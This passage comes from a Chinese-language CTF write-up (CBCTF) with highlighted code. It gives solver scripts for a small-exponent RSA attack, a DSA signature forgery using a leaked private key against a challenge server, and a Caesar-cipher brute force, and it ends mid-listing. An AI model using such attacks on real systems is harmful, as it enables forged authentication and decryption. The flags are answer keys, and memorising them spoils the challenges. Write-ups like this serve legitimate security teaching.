class="number">44325518006091876721605823409610042252069625967882044704024214032751966871521847773994263894312607474509588371872161541972144207214032339247431102110456229841266040285615770275478438280620725262108096170791001509463685129909286120575052133129389839912877047603238192564639423047082080059345481052412519925381</span></span><br><span class="line">c = <span class="number">73434158249386043625252431253323506682208843849831594508828737831830362719932115747428792429497868946601098023909629141071257910108747977030342842534107828613672478901354339083057876376985055292417284326608488912346944387146680464066055117328325698648200021918802428101944953998434164564886207047699320456022</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">continued_fraction</span>(<span class="params">n, d</span>):</span><br><span class="line">    cf = []</span><br><span class="line">    <span class="keyword">while</span> d:</span><br><span class="line">        q, r = <span class="built_in">divmod</span>(n, d)</span><br><span class="line">        cf.append(q)</span><br><span class="line">        n, d = d, r</span><br><span class="line">    <span class="keyword">return</span> cf</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convergents</span>(<span class="params">cf</span>):</span><br><span class="line">    num, den = [], []</span><br><span class="line">    <span class="keyword">for</span> i, q <span class="keyword">in</span> <span class="built_in">enumerate</span>(cf):</span><br><span class="line">        <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">            num.append(q)</span><br><span class="line">            den.append(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">elif</span> i == <span class="number">1</span>:</span><br><span class="line">            num.append(q*num[-<span class="number">1</span>] + <span class="number">1</span>)</span><br><span class="line">            den.append(q*den[-<span class="number">1</span>])</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            num.append(q*num[-<span class="number">1</span>] + num[-<span class="number">2</span>])</span><br><span class="line">            den.append(q*den[-<span class="number">1</span>] + den[-<span class="number">2</span>])</span><br><span class="line">        <span class="keyword">yield</span> (num[-<span class="number">1</span>], den[-<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">cf = continued_fraction(e, N)</span><br><span class="line"><span class="keyword">for</span> k, d <span class="keyword">in</span> convergents(cf):</span><br><span class="line">    <span class="keyword">if</span> d == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> d.bit_length() &lt; <span class="number">99</span> <span class="keyword">or</span> d.bit_length() &gt; <span class="number">101</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> (e * d - <span class="number">1</span>) % k == <span class="number">0</span>:</span><br><span class="line">        phi = (e * d - <span class="number">1</span>) // k</span><br><span class="line"></span><br><span class="line">        s = N - phi + <span class="number">1</span></span><br><span class="line">        <span class="comment"># p, q 是 x^2 - s*x + N = 0 的根</span></span><br><span class="line">        discriminant = s*s - <span class="number">4</span>*N</span><br><span class="line">        <span class="keyword">if</span> discriminant &gt;= <span class="number">0</span>:</span><br><span class="line">            sqrt_disc = gmpy2.isqrt(discriminant)</span><br><span class="line">            <span class="keyword">if</span> sqrt_disc * sqrt_disc == discriminant:</span><br><span class="line">                p = (s + sqrt_disc) // <span class="number">2</span></span><br><span class="line">                q = (s - sqrt_disc) // <span class="number">2</span></span><br><span class="line">                <span class="keyword">if</span> p * q == N:</span><br><span class="line">                    m = <span class="built_in">pow</span>(c, d, N)</span><br><span class="line">                    flag = long_to_bytes(m)</span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&quot;Flag:&quot;</span>, flag)</span><br><span class="line">                    exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<p>得到<strong>CBCTF{w3lc0m3_to_AES}</strong></p>
<ul>
<li>Chaos</li>
</ul>
<blockquote>
<p>Random, mysterious, and, well… ha! At first glance, it’s just a jumble of data and signatures. But for those willing to play, the chaos might just whisper a few secrets of its hidden order.</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从外部文件读取参数</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;params.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    params_content = f.read()</span><br><span class="line">    <span class="built_in">exec</span>(params_content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_nonce</span>():</span><br><span class="line">    <span class="keyword">return</span> (random.getrandbits(<span class="number">32</span>) % (q - <span class="number">1</span>)) + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign</span>(<span class="params">msg: <span class="built_in">str</span>, x: <span class="built_in">int</span></span>):</span><br><span class="line">    k = gen_nonce()</span><br><span class="line">    r = <span class="built_in">pow</span>(g, k, p) % q</span><br><span class="line">    hm = <span class="built_in">int</span>.from_bytes(sha1(msg.encode()).digest(), <span class="string">&#x27;big&#x27;</span>) % q</span><br><span class="line">    s = (<span class="built_in">pow</span>(k, -<span class="number">1</span>, q) * (hm + x * r)) % q</span><br><span class="line">    <span class="keyword">return</span> r, s</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">import</span> json, sys</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Usage: python client.py &lt;msg&gt;&#x27;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 使用环境变量或默认值设置种子</span></span><br><span class="line">    seed_value = os.environ.get(<span class="string">&#x27;RANDOM_SEED&#x27;</span>, <span class="number">0x38F23A4C</span>)</span><br><span class="line">    random.seed(seed_value)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 生成随机消息</span></span><br><span class="line">    messages = [os.urandom(<span class="number">16</span>).<span class="built_in">hex</span>() <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">700</span>)]</span><br><span class="line">    special_message = <span class="string">&quot;request_special_resource&quot;</span></span><br><span class="line">    messages.append(special_message)</span><br><span class="line"></span><br><span class="line">    signatures = []</span><br><span class="line">    base_timestamp = <span class="built_in">int</span>(time.time())</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i, msg <span class="keyword">in</span> <span class="built_in">enumerate</span>(messages):</span><br><span class="line">        <span class="comment"># 生成nonce k</span></span><br><span class="line">        k_value = random.getrandbits(<span class="number">32</span>) % (q - <span class="number">1</span>) + <span class="number">1</span></span><br><span class="line">        r_value = <span class="built_in">pow</span>(g, k_value, p) % q</span><br><span class="line">        hash_msg = <span class="built_in">int</span>.from_bytes(sha1(msg.encode()).digest(), <span class="string">&#x27;big&#x27;</span>) % q</span><br><span class="line">        s_value = (<span class="built_in">pow</span>(k_value, -<span class="number">1</span>, q) * (hash_msg + x * r_value)) % q</span><br><span class="line">    </span><br><span class="line">        request_data = &#123;</span><br><span class="line">            <span class="string">&quot;method&quot;</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">            <span class="string">&quot;path&quot;</span>: <span class="string">&quot;/api/endpoint&quot;</span>,</span><br><span class="line">            <span class="string">&quot;timestamp&quot;</span>: base_timestamp + i,</span><br><span class="line">            <span class="string">&quot;username&quot;</span>: <span class="string">&quot;SystemUser&quot;</span>,</span><br><span class="line">            <span class="string">&quot;data&quot;</span>: &#123;</span><br><span class="line">                <span class="string">&quot;message&quot;</span>: msg,</span><br><span class="line">                <span class="string">&quot;signature_r&quot;</span>: <span class="built_in">str</span>(r_value),</span><br><span class="line">                <span class="string">&quot;signature_s&quot;</span>: <span class="built_in">str</span>(s_value)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        signatures.append(request_data)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;requests.jsonl&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&quot;utf-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> sig <span class="keyword">in</span> signatures:</span><br><span class="line">            f.write(json.dumps(sig, ensure_ascii=<span class="literal">False</span>) + <span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Request data generated successfully&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># simple local verifier - reads requests.jsonl in same directory</span></span><br><span class="line"><span class="keyword">import</span> json,socketserver</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">p = <span class="number">8576266215257684451627938266209288368747290850430257232775662794860889167273173590976498454387838065099555150702527005228232224203671818388040396426167421</span></span><br><span class="line">q = <span class="number">1092510234019</span></span><br><span class="line">g = <span class="number">7144062426562178459134763982605952302933077316845461785177531950627385795442407387260745982564084210402482982761274236868248912040071369181916889827118820</span></span><br><span class="line">y = <span class="number">8291891676739439066670566927114794141859628227389282017383200710395666779939972786268373568231932748094932532880440197180527838969047845790921891292250679</span></span><br><span class="line">FLAG = os.getenv(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;uuid&#123;xixixixi&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modinv</span>(<span class="params">a, m</span>):  </span><br><span class="line">    a = a % m</span><br><span class="line">    lm, hm = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    low, high = a % m, m</span><br><span class="line">    <span class="keyword">while</span> low &gt; <span class="number">1</span>:</span><br><span class="line">        r = high // low</span><br><span class="line">        nm, new = hm - lm * r, high - low * r</span><br><span class="line">        lm, low, hm, high = nm, new, lm, low</span><br><span class="line">    <span class="keyword">return</span> lm % m</span><br><span class="line">   </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">verify</span>(<span class="params">msg: <span class="built_in">str</span>, r: <span class="built_in">int</span>, s: <span class="built_in">int</span></span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (<span class="number">0</span> &lt; r &lt; q <span class="keyword">and</span> <span class="number">0</span> &lt; s &lt; q):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    hm = <span class="built_in">int</span>.from_bytes(sha1(msg.encode()).digest(), <span class="string">&#x27;big&#x27;</span>) % q</span><br><span class="line">    w = modinv(s, q)</span><br><span class="line">    u1 = (hm * w) % q</span><br><span class="line">    u2 = (r * w) % q</span><br><span class="line">    v = ((<span class="built_in">pow</span>(g, u1, p) * <span class="built_in">pow</span>(y, u2, p)) % p) % q</span><br><span class="line">    <span class="keyword">return</span> v == r</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Handler</span>(socketserver.BaseRequestHandler):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">handle</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.request.sendall(<span class="string">b&quot;Send me JSON lines like &#123;\&quot;msg\&quot;:\&quot;...\&quot;,\&quot;r\&quot;:\&quot;...\&quot;,\&quot;s\&quot;:\&quot;...\&quot;&#125;\n&quot;</span>)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            line = <span class="variable language_">self</span>.request.recv(<span class="number">4096</span>).strip()</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> line:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                data = json.loads(line.decode())</span><br><span class="line">                msg = data[<span class="string">&#x27;msg&#x27;</span>]</span><br><span class="line">                r = <span class="built_in">int</span>(data[<span class="string">&#x27;r&#x27;</span>])</span><br><span class="line">                s = <span class="built_in">int</span>(data[<span class="string">&#x27;s&#x27;</span>])</span><br><span class="line">                ok = verify(msg, r, s)</span><br><span class="line">                <span class="variable language_">self</span>.request.sendall(<span class="string">f&quot;MSG=<span class="subst">&#123;msg&#125;</span> OK=<span class="subst">&#123;ok&#125;</span>\n&quot;</span>.encode())</span><br><span class="line">                <span class="keyword">if</span> ok <span class="keyword">and</span> msg == <span class="string">&quot;give_me_flag&quot;</span>:</span><br><span class="line">                    <span class="variable language_">self</span>.request.sendall(<span class="string">f&quot;FLAG: <span class="subst">&#123;FLAG&#125;</span>\n&quot;</span>.encode())</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="variable language_">self</span>.request.sendall(<span class="string">f&quot;Error: <span class="subst">&#123;e&#125;</span>\n&quot;</span>.encode())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    server = socketserver.ThreadingTCPServer((<span class="string">&quot;0.0.0.0&quot;</span>, <span class="number">12345</span>), Handler)</span><br><span class="line">    server.serve_forever()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">p = 8576266215257684451627938266209288368747290850430257232775662794860889167273173590976498454387838065099555150702527005228232224203671818388040396426167421</span><br><span class="line">q = 1092510234019</span><br><span class="line">g = 7144062426562178459134763982605952302933077316845461785177531950627385795442407387260745982564084210402482982761274236868248912040071369181916889827118820</span><br><span class="line">x = 379478523492</span><br><span class="line">y = 8291891676739439066670566927114794141859628227389282017383200710395666779939972786268373568231932748094932532880440197180527838969047845790921891292250679</span><br><span class="line"></span><br><span class="line">P_bits= 512</span><br><span class="line">NUM_SAMPLES:= 700</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"></span><br><span class="line"><span class="comment"># 题目提供的参数</span></span><br><span class="line">p = <span class="number">8576266215257684451627938266209288368747290850430257232775662794860889167273173590976498454387838065099555150702527005228232224203671818388040396426167421</span></span><br><span class="line">q = <span class="number">1092510234019</span></span><br><span class="line">g = <span class="number">7144062426562178459134763982605952302933077316845461785177531950627385795442407387260745982564084210402482982761274236868248912040071369181916889827118820</span></span><br><span class="line">x = <span class="number">379478523492</span>  <span class="comment"># 已知的私钥</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">modinv</span>(<span class="params">a, m</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">pow</span>(a, -<span class="number">1</span>, m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sign_message</span>(<span class="params">msg, x, p, q, g</span>):</span><br><span class="line">    <span class="comment"># 我们可以随便选一个 k，只要满足 1 &lt;= k &lt; q</span></span><br><span class="line">    k = <span class="number">123456789</span> </span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 1. 计算 r</span></span><br><span class="line">    r = <span class="built_in">pow</span>(g, k, p) % q</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 2. 计算消息的哈希值</span></span><br><span class="line">    hm = <span class="built_in">int</span>.from_bytes(sha1(msg.encode()).digest(), <span class="string">&#x27;big&#x27;</span>) % q</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 3. 计算 s = k^-1 * (hm + x*r) mod q</span></span><br><span class="line">    k_inv = modinv(k, q)</span><br><span class="line">    s = (k_inv * (hm + x * r)) % q</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> r, s</span><br><span class="line"></span><br><span class="line"><span class="comment"># 目标消息</span></span><br><span class="line">target_msg = <span class="string">&quot;give_me_flag&quot;</span></span><br><span class="line">r, s = sign_message(target_msg, x, p, q, g)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造发送给服务器的 JSON</span></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;msg&quot;</span>: target_msg,</span><br><span class="line">    <span class="string">&quot;r&quot;</span>: <span class="built_in">str</span>(r),</span><br><span class="line">    <span class="string">&quot;s&quot;</span>: <span class="built_in">str</span>(s)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(json.dumps(payload))</span><br></pre></td></tr></table></figure>
<p>nc，发送 {“msg”: “give_me_flag”, “r”: “390893041773”, “s”: “814033672429”}</p>
<p><strong>CBCTF{cd1fa9af-2c4a-4b79-a602-650a7f496f7f}</strong></p>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a><strong>Reverse</strong></h2><ul>
<li>Welcome</li>
</ul>
<blockquote>
<p>入门第一课，找到加密后的flag吧</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v4[<span class="number">112</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v5[<span class="number">104</span>]; <span class="comment">// [rsp+90h] [rbp+10h] BYREF</span></span><br><span class="line">  <span class="type">char</span> *iodj_Qrz_BrX_ILQg_Phhhhh_; <span class="comment">// [rsp+F8h] [rbp+78h]</span></span><br><span class="line"></span><br><span class="line">  _main();</span><br><span class="line">  iodj_Qrz_BrX_ILQg_Phhhhh_ = <span class="string">&quot;iodj&#123;Qrz-BrX-ILQg-Phhhhh&#125;&quot;</span>;</span><br><span class="line">  puts_0(<span class="string">&quot;Welcome To The CTF World&quot;</span>);</span><br><span class="line">  puts_0(<span class="string">&quot;This is your flag, but it needs to be decrypted.&quot;</span>);</span><br><span class="line">  printf_0(&amp;Format);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%99s&quot;</span>, v4);</span><br><span class="line">  caesarEncrypt(v4, v5);</span><br><span class="line">  compareFlags(v5, iodj_Qrz_BrX_ILQg_Phhhhh_);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">caesar_bruteforce</span>(<span class="params">ciphertext</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;暴力破解凯撒密码&quot;&quot;&quot;</span></span><br><span class="line">    results = []</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 遍历所有可能的偏移量（1-25）</span></span><br><span class="line">    <span class="keyword">for</span> shift <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">26</span>):</span><br><span class="line">        decrypted = <span class="string">&quot;&quot;</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> char <span class="keyword">in</span> ciphertext:</span><br><span class="line">            <span class="keyword">if</span> char.isalpha():</span><br><span class="line">                <span class="comment"># 处理大写字母</span></span><br><span class="line">                <span class="keyword">if</span> char.isupper():</span><br><span class="line">                    base = <span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">                    decrypted_char = <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - base - shift) % <span class="number">26</span> + base)</span><br><span class="line">                <span class="comment"># 处理小写字母</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    base = <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">                    decrypted_char = <span class="built_in">chr</span>((<span class="built_in">ord</span>(char) - base - shift) % <span class="number">26</span> + base)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="comment"># 非字母字符保持不变</span></span><br><span class="line">                decrypted_char = char</span><br><span class="line">            </span><br><span class="line">            decrypted += decrypted_char</span><br><span class="line">        </span><br><span class="line">        results.append(<span class="string">f&quot;Shift <span class="subst">&#123;shift:2d&#125;</span>: <span class="subst">&#123;decrypted&#125;</span>&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> results</span><br><span class="line"></span><br><span class="line">ciphertext = <span class="string">&quot;iodj&#123;Qrz-BrX-ILQg-Phhhhh&#125;&quot;</span></span><br><span class="line"></span><br><span class="line">decryptions = caesar_bruteforce(ciphertext)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 输出所有结果</span></span><br><span class="line"><span class="keyword">for</span> result <span class="keyword">in</span> decryptions:</span><br><span class="line">    <span class="built_in">print</span>(result)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;最有可能的结果（常见flag格式）:&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查找包含 &quot;flag&#123;&quot; 的结果</span></span><br><span class="line"><span class="keyword">for</span> result <span class="keyword">in</span> decryptions:</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&#123;&quot;</span> <span class="keyword">in</span> result.lower():</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;  ==&gt; <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>flag{Now-YoU-FINd-Meeeee}得到<strong>CBCTF{Now-YoU-FINd-Meeeee}</strong></p>
<ul>
<li>Lost_key</li>
</ul>
<blockquote>
<p>大嗨客的SkipShot搓了一个RSA加解密工具，把价值1000分的机密数据给加密了，为了不让别人知道，他把私钥给藏起来了。。。在严刑拷打(并非严刑)之下，他把他的工具交出来了，你能把这个机密数据还原出来吗？</p>
<p>试试bindiff工具~</p>
</blockquote>
<p>非预期了哈，不会装插件555</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span 